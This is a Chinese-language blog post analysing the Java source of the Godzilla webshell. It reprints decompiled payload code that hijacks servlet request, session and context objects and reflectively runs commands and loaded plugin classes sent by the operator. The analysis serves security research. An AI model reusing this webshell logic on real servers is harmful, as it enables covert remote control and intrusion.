@@ -1,0 +1,471 @@
+title: 哥斯拉源码分析( 二)
+date: 2025-7-24
+tags: []
+categories: []
+author: cmisl
+
+现在是7月24号，回想起之前关于哥斯拉源码分析的文章其实还有颇多不足之处，做一点补充。之前已经提过了发送的指令数据如何封装发送。现在看看shell是怎么对指令做处理并且去执行的对应方法的。
+
+在我们第一次注入进大马后，后续的指令发送，如果密码密钥之类的没问题，会走到下面逻辑
+
+```java
+request.setAttribute("parameters", data);  
+java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();  
+Object f = ((Class) session.getAttribute("payload")).newInstance();  
+f.equals(arrOut);  
+f.equals(pageContext);  
+response.getWriter().write(md5.substring(0, 16));  
+f.toString();  
+response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));  
+response.getWriter().write(md5.substring(16));
+```
+
+f是注入的大马的实例，可以看到后续会调用其equals和toString方法。这里可不是判断相等和字符串输出的方法，而是自实现暗藏玄机的一段代码。在执行webshell管理器发送的指令起到了很关键的作用。
+
+## equals
+
+没啥好说的，把收到的对象丢到handle函数处理。
+
+```java
+public boolean equals(Object obj) {  
+    if (obj != null && this.handle(obj)) {  
+        this.noLog(this.servletContext);  
+        return true;  
+    } else {  
+        return false;  
+    }  
+}
+```
+
+### handle
+
+因此重心可以放在handle方法，这个方法用于处理和分发传入的不同对象类型。class$1没有显示初始化，因此可以用默认值看待，对于Class默认值应该是null。
+
+这个是判断传入的对象是否是ByteArrayOutputStream类型，如果是的话，就将传入的对象赋值给该大马的outputStream成员变量。不是的话进入另外的分支。
+
+```java
+public boolean handle(Object obj) {  
+    if (obj == null) {  
+        return false;  
+    } else {  
+        Class var10000 = class$1;  
+        if (var10000 == null) {  
+            try {  
+                var10000 = Class.forName("java.io.ByteArrayOutputStream");  
+            } catch (ClassNotFoundException var7) {  
+                throw new NoClassDefFoundError(((Throwable)var7).getMessage());  
+            }  
+  
+            class$1 = var10000;  
+        }  
+  
+        if (var10000.isAssignableFrom(obj.getClass())) {  
+            this.outputStream = (ByteArrayOutputStream)obj;  
+            return false;  
+        }
+	......
+}
+```
+
+走到上述代码的else分支语句中，涉及到了另一个方法，supportClass。这部分主要是检测传入的obj是否属于下面四个类，jakarta是为了tomcat10+版本做适配：
+- javax.servlet.http.HttpServletRequest
+- jakarta.servlet.http.HttpServletRequest
+- javax.servlet.ServletRequest
+- jakarta.servlet.ServletRequest
+
+```java
+public boolean handle(Object obj){
+	......
+	else{
+		if (this.supportClass(obj, "%s.servlet.http.HttpServletRequest")){ 
+		    this.servletRequest = obj;  
+		} else if (this.supportClass(obj, "%s.servlet.ServletRequest")) {  
+		    this.servletRequest = obj;  
+		}
+		......
+	}
+	......
+}
+
+private boolean supportClass(Object obj, String classNameString) {  
+    if (obj == null) {  
+        return false;  
+    } else {  
+        boolean ret = false;  
+        Class c = null;  
+  
+        try {  
+            if ((c = getClass(String.format(classNameString, "javax"))) != null) {  
+                ret = c.isAssignableFrom(obj.getClass());  
+            }  
+  
+            if (!ret && (c = getClass(String.format(classNameString, "jakarta"))) != null) {  
+                ret = c.isAssignableFrom(obj.getClass());  
+            }  
+        } catch (Exception var6) {  
+        }  
+  
+        return ret;  
+    }  
+}
+```
+
+如果上面四个类都没命中，就进入else语句，这里和刚刚一样class$0默认值为null，因此开始会将其和var10000赋值为字节数组的Class对象。所以后续匹配就是匹配obj是否为byte[]。如果是的话，就将obj赋值给当前大马的requestData成员变量。不是的话还会再次调用supportClass方法，去匹配java.servlet.http.HttpSession和jakarta.servlet.http.HttpSession这两个类。命中的话赋值给当前大马的httpSession成员变量。
+
+```java
+else {  
+    var10000 = class$0;  
+    if (var10000 == null) {  
+        try {  
+            var10000 = Class.forName("[B");  
+        } catch (ClassNotFoundException var6) {  
+            throw new NoClassDefFoundError(((Throwable)var6).getMessage());  
+        }  
+  
+        class$0 = var10000;  
+    }  
+  
+    if (var10000.isAssignableFrom(obj.getClass())) {  
+        this.requestData = (byte[])obj;  
+    } else if (this.supportClass(obj, "%s.servlet.http.HttpSession")) {  
+        this.httpSession = obj;  
+    }
+
+	this.handlePayloadContext(obj);
+}
+```
+
+这里匹配完会会调用handlePayloadContext方法。
+
+```java
+private void handlePayloadContext(Object obj) {  
+    try {  
+        Method getRequestMethod = this.getMethodByClass(obj.getClass(), "getRequest", (Class[])null);  
+        Method getServletContextMethod = this.getMethodByClass(obj.getClass(), "getServletContext", (Class[])null);  
+        Method getSessionMethod = this.getMethodByClass(obj.getClass(), "getSession", (Class[])null);  
+        if (getRequestMethod != null && this.servletRequest == null) {  
+            this.servletRequest = getRequestMethod.invoke(obj, (Object[])null);  
+        }  
+  
+        if (getServletContextMethod != null && this.servletContext == null) {  
+            this.servletContext = getServletContextMethod.invoke(obj, (Object[])null);  
+        }  
+  
+        if (getSessionMethod != null && this.httpSession == null) {  
+            this.httpSession = getSessionMethod.invoke(obj, (Object[])null);  
+        }  
+    } catch (Exception var5) {  
+    }  
+  
+}
+```
+
+这个方法是进一步获取其他环境信息，获取反射获取传入obj的getRequest、getServletContext、getSession属性，如果存在的话并且当前成员变量对应的值是null，那就赋值给成员变量。
+
+比如在tomcat8就有如下调用，如果obj传入的是pageContext，就可以获取当前环境的HttpSession、ServletRequest和ServletContext，其他的也类似。
+
+```java
+request.getSession();  
+request.getServletContext();  
+  
+session.getServletContext();  
+  
+pageContext.getRequest();  
+pageContext.getSession();  
+pageContext.getServletContext();
+```
+
+接着下面代码看起来很长，实际就是如果有成员变量servletRequest，并且requestData为null。就去通过反射调用servletRequest.getAttribute("parameters")方法，如果返回的结果是字节数组，就将其赋值给requestData。
+
+实际上就就是为了获取传入的data，因为还记得最开始提到shell的第一段代码是什么吗，正是request.setAttribute("parameters", data);。
+
+```java
+if (this.servletRequest != null && this.requestData == null) {  
+    Object var10001 = this.servletRequest;  
+    Class[] var10003 = new Class[1];  
+    Class var10006 = class$2;  
+    if (var10006 == null) {  
+        try {  
+            var10006 = Class.forName("java.lang.String");  
+        } catch (ClassNotFoundException var5) {  
+            throw new NoClassDefFoundError(((Throwable)var5).getMessage());  
+        }  
+  
+        class$2 = var10006;  
+    }  
+  
+    var10003[0] = var10006;  
+    Object retVObject = this.getMethodAndInvoke(var10001, "getAttribute", var10003, new Object[]{"parameters"});  
+    if (retVObject != null) {  
+        var10000 = class$0;  
+        if (var10000 == null) {  
+            try {  
+                var10000 = Class.forName("[B");  
+            } catch (ClassNotFoundException var4) {  
+                throw new NoClassDefFoundError(((Throwable)var4).getMessage());  
+            }  
+  
+            class$0 = var10000;  
+        }  
+  
+        if (var10000.isAssignableFrom(retVObject.getClass())) {  
+            this.requestData = (byte[])retVObject;  
+        }  
+    }  
+}
+```
+
+这样下来思路就很清晰了，直接通过两个equals将大马payload中五个变量就赋值了，outputStream就是arrOut，servletContext、servletRequest、httpSession可以通过pageContext反射调用方法获取，然后requestData也是通过反射获取servletRequest中小马中加进去的data。
+
+![](pict/源码分析——哥斯拉/image-20250724175225271.png)
+## toString
+
+接着就是toString方法了。先看最前面，首先是判断outputStream是否为null，这个我们用equal设置了为arrOut，自然不是null，因此可以走进语句，这里在用GZIPOutputStream封装outputStream前后会调用initSessionMap和formatParameter方法。
+
+```java
+public String toString() {  
+    String returnString = null;  
+    if (this.outputStream != null) {  
+        try {  
+            this.initSessionMap();  
+            GZIPOutputStream gzipOutputStream = new GZIPOutputStream(this.outputStream);  
+            this.formatParameter();  
+			......
+}
+```
+
+### initSessionMap
+
+先看看initSessionMap，这个方法主要是初始化一个SessionMap用于处理后续session相关部分的管理。首先是判断sessionMap这个成员变量是否为null，这个自然是的，因为前面的equal操作是没有对sessionMap做赋值的。然后会调用getSessionAttribute方法，通过反射执行getAttribute方法获取名为sessionMap的属性值。
+
+实际上session中的Attribute还是以Map的结构存储的，刚刚通过反射执行自然也是null，因为我们还没有往session中的这个Map设置键为sessionMap的数据。因此后面会调用setSessionAttribute方法，这个方法同样也是通过反射去执行session的setAttribute方法。添加一个一个键为sessionMap，值是new的一个HashMap对象，当然在此之前该新建的HashMap对象也设置到了sessionMap这个成员变量中了。后续再调用到该方法就可以通过getSessionAttribute获取sessionMap了。
+
+```java
+private void initSessionMap() {  
+    if (this.sessionMap == null) {  
+        if (this.getSessionAttribute("sessionMap") != null) {  
+            try {  
+                this.sessionMap = (HashMap)this.getSessionAttribute("sessionMap");  
+            } catch (Exception var3) {  
+            }  
+        } else {  
+            this.sessionMap = new HashMap();  
+  
+            try {  
+                this.setSessionAttribute("sessionMap", this.sessionMap);  
+            } catch (Exception var2) {  
+            }  
+        }  
+  
+        if (this.sessionMap == null) {  
+            this.sessionMap = new HashMap();  
+        }  
+    }  
+  
+}
+
+public Object getSessionAttribute(String keyString) {  
+    if (this.httpSession != null) {  
+        Object var10001 = this.httpSession;  
+        Class[] var10003 = new Class[1];  
+        Class var10006 = class$2;  
+        if (var10006 == null) {  
+            try {  
+                var10006 = Class.forName("java.lang.String");  
+            } catch (ClassNotFoundException var2) {  
+                throw new NoClassDefFoundError(((Throwable)var2).getMessage());  
+            }  
+  
+            class$2 = var10006;  
+        }  
+  
+        var10003[0] = var10006;  
+        return this.getMethodAndInvoke(var10001, "getAttribute", var10003, new Object[]{keyString});  
+    } else {  
+        return null;  
+    }  
+}
+
+public void setSessionAttribute(String keyString, Object value) {  
+    if (this.httpSession != null) {  
+        Object var10001 = this.httpSession;  
+        Class[] var10003 = new Class[2];  
+        Class var10006 = class$2;  
+        if (var10006 == null) {  
+            try {  
+                var10006 = Class.forName("java.lang.String");  
+            } catch (ClassNotFoundException var4) {  
+                throw new NoClassDefFoundError(((Throwable)var4).getMessage());  
+            }  
+  
+            class$2 = var10006;  
+        }  
+  
+        var10003[0] = var10006;  
+        var10006 = class$5;  
+        if (var10006 == null) {  
+            try {  
+                var10006 = Class.forName("java.lang.Object");  
+            } catch (ClassNotFoundException var3) {  
+                throw new NoClassDefFoundError(((Throwable)var3).getMessage());  
+            }  
+  
+            class$5 = var10006;  
+        }  
+  
+        var10003[1] = var10006;  
+        this.getMethodAndInvoke(var10001, "setAttribute", var10003, new Object[]{keyString, value});  
+    }  
+  
+}
+```
+
+### formatparameter
+
+接着还调用了formatParameter方法。首先清除parameterMap，避免上一次请求数据对本次请求有影响。然后将一些上下文相关的对象给设置进去，提供后续使用。
+
+```java
+public void formatParameter() {  
+    this.parameterMap.clear();  
+    this.parameterMap.put("sessionMap", this.sessionMap);  
+    this.parameterMap.put("servletRequest", this.servletRequest);  
+    this.parameterMap.put("servletContext", this.servletContext);  
+    this.parameterMap.put("httpSession", this.httpSession);  
+    ......
+}
+```
+
+接着定义了一些变量，parameterByte是给他赋值了requestData，也就是本次请求哥斯拉webshell管理器发送的请求体数据。然后将数据包装到了输入流tStream中，然后就是其余一些后续用的变量，后续看代码即可知道作用了。
+
+```java
+byte[] parameterByte = this.requestData;  
+ByteArrayInputStream tStream = new ByteArrayInputStream(parameterByte);  
+ByteArrayOutputStream tp = new ByteArrayOutputStream();  
+String key = null;  
+byte[] lenB = new byte[4];  
+byte[] data = null;  
+```
+
+下面这部分就是解析数据流中的指令了。首先对输入流gzip解压，然后开始循环读取每个字节，如果读取到的字节是-1的话，就代表流结束，那么就结束资源退出循环。
+
+如果读取到的字节是2，代表分隔符，就开始解析一个键值对。其实就是evalFunc的逆向解析过程。我曾在连接部分的末尾放出了一个逻辑代码，可能之前只是想单纯做个笔记，就没有仔细解释，实际上就是将指令存储在hashMap中，然后对每个key和value之间，会插入五个字节，其中第一个字节就是分隔符2了，其余四个字节代表存储的是value的长度。
+
+因此解析请求数据时就可以先一直读取，直到分隔符2，就可以知道key读取到了，接着读取四个字节，计算value的字节长度，得到后就读这么长的数据，那么读到的就是value了。然后就可以继续下一个key和value，直到数据流的结束。读到的这些键值对都put进parameterMap变量中。
+
+```java
+GZIPInputStream inputStream = new GZIPInputStream(tStream);  
+  
+while(true) {  
+    byte t = (byte)((InflaterInputStream)inputStream).read();  
+    if (t == -1) {  
+        tp.close();  
+        tStream.close();  
+        inputStream.close();  
+        break;  
+    }  
+  
+    if (t == 2) {  
+        key = new String(tp.toByteArray());  
+        ((FilterInputStream)inputStream).read(lenB);  
+        int len = bytesToInt(lenB);  
+        data = new byte[len];  
+        int readOneLen = 0;  
+  
+        while((readOneLen += inputStream.read(data, readOneLen, data.length - readOneLen)) < data.length) {  
+        }  
+  
+        this.parameterMap.put(key, data);  
+        tp.reset();  
+    } else {  
+        tp.write(t);  
+    }  
+}
+```
+
+ok接着回到toString方法，evalNextData应该是和扩展的shell有关，一般扩展和插件都需要include指令，我推测这里单独的run方法就是为了执行incldue指令将自定义字节码加载进来，然后因为改动了sessionMap，用formatParameter重新格式化一下。
+
+那么接下来就是去正常执行run方法了，这是根据解析出来的指令动态调用具体的shell方法的核心代码，然后返回执行的结果。
+
+```java
+if (this.parameterMap.get("evalNextData") != null) {  
+    this.run();  
+    this.requestData = (byte[])this.parameterMap.get("evalNextData");  
+    this.formatParameter();  
+}  
+  
+((FilterOutputStream)gzipOutputStream).write(this.run());  
+((DeflaterOutputStream)gzipOutputStream).close();  
+this.outputStream.close();
+```
+
+### run
+
+首先从parameterMap中获取evalClassName和methodName的值，分别赋值给className和methodName，其中methodName不能为空，否则就直接返回method is null。
+
+而如果className为空，那么就会去反射调用当前类的中的方法，具体的方法名由methodName指定。然后用getReturnType获取这个方法的返回值类型，如果是byte[]，就调用方法并且返回结果，否则返回this method returnType not is byte[]的字节数组。
+
+如果className不为空，就从sessionMap中获取对于的Class对象，然后newInstance实例化出来，接着调用其自实现的equals和toString方法。这里其实是在执行了include指令之后才会走到此处，include指令的功能是注入制定的字节码，很多插件扩展的功能的前置都是该指令。
+
+```java
+public byte[] run() {  
+    try {  
+        String className = this.get("evalClassName");  
+        String methodName = this.get("methodName");  
+        if (methodName != null) {  
+            if (className == null) {  
+                Method method = this.getClass().getMethod(methodName, (Class[])null);  
+                Class var12 = method.getReturnType();  
+                Class var10001 = class$0;  
+                if (var10001 == null) {  
+                    try {  
+                        var10001 = Class.forName("[B");  
+                    } catch (ClassNotFoundException var6) {  
+                        throw new NoClassDefFoundError(((Throwable)var6).getMessage());  
+                    }  
+  
+                    class$0 = var10001;  
+                }  
+  
+                return var12.isAssignableFrom(var10001) ? (byte[])method.invoke(this, (Object[])null) : "this method returnType not is byte[]".getBytes();  
+            } else {  
+                Class evalClass = (Class)this.sessionMap.get(className);  
+                if (evalClass != null) {  
+                    Object object = evalClass.newInstance();  
+                    object.equals(this.parameterMap);  
+                    object.toString();  
+                    Object resultObject = this.parameterMap.get("result");  
+                    if (resultObject != null) {  
+                        Class var10000 = class$0;  
+                        if (var10000 == null) {  
+                            try {  
+                                var10000 = Class.forName("[B");  
+                            } catch (ClassNotFoundException var7) {  
+                                throw new NoClassDefFoundError(((Throwable)var7).getMessage());  
+                            }  
+  
+                            class$0 = var10000;  
+                        }  
+  
+                        return var10000.isAssignableFrom(resultObject.getClass()) ? (byte[])resultObject : "return typeErr".getBytes();  
+                    } else {  
+                        return new byte[0];  
+                    }  
+                } else {  
+                    return "evalClass is null".getBytes();  
+                }  
+            }  
+        } else {  
+            return "method is null".getBytes();  
+        }  
+    } catch (Throwable e) {  
+        ByteArrayOutputStream stream = new ByteArrayOutputStream();  
+        PrintStream printStream = new PrintStream(stream);  
+        e.printStackTrace(printStream);  
+        printStream.flush();  
+        printStream.close();  
+        return stream.toByteArray();  
+    }  
+}
+```
+
+以上就是本次全部内容，由于在工作之余完成，最近较忙可能有些纰漏和错误，思来想去还是发出来作为参考，如果有问题欢迎大家指正。后续如果有新的内容和改正的点也会在这里补充修改，。
